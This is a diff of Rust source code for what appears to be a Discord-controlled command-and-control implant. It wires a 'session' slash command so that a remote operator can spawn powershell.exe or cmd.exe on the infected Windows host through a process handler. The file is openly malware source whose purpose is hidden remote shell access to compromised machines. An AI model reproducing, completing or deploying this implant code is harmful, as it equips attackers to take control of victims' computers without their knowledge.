@@ -10,6 +10,8 @@ use serenity::{
     client::Context,
 };
 
+use crate::os::process_handler::ProcessHandler;
+
 pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicationCommand {
     // Register the session command
     command
@@ -27,7 +29,7 @@ pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicatio
         )
 }
 
-pub async fn run(ctx: &Context, options: &[CommandDataOption]) -> Result<String, DiscordC2Error> {
+pub async fn run(ctx: &Context, options: &[CommandDataOption]) -> Result<(String, Option<String>), DiscordC2Error> {
     let mut agent = get_or_create_agent(ctx).await;
     let now = Utc::now().format("%m-%d-%Y┇%H︰%M︰%S╏UTC").to_string();
 
@@ -51,25 +53,19 @@ pub async fn run(ctx: &Context, options: &[CommandDataOption]) -> Result<String,
     Command::create_global_application_command(&ctx.http, exit::register).await?;
 
     if let CommandDataOptionValue::String(shell_type) = option {
-        match shell_type.as_str() {
-            "powershell" => open_shell("powershell").await?,
-            "cmd" => open_shell("cmd").await?,
-            _ => return Ok(format!("Unsupported shell type: {}", shell_type)),
-        }
+        let (content, shell) = match shell_type.as_str() {
+            "powershell" => {
+                ProcessHandler::instance("powershell.exe").await?;
+                (string, shell_type.clone())
+            },
+            "cmd" => {
+                ProcessHandler::instance("cmd.exe").await?;
+                (string, shell_type.clone())
+            },
+            _ => return Ok((format!("Unsupported shell type: {}", shell_type), None)),
+        };
+        Ok((content.parse().unwrap(), Option::from(shell)))
     } else {
-        return Ok("No options were specified.".to_string());
+        return Ok(("No options were specified.".to_string(), None));
     }
-
-    Ok(string)
-}
-
-
-async fn open_shell(shell_type: &str) -> Result<(), DiscordC2Error> {
-    if shell_type == "powershell" {
-
-    } else {
-
-    }
-
-    return Ok(());
 }
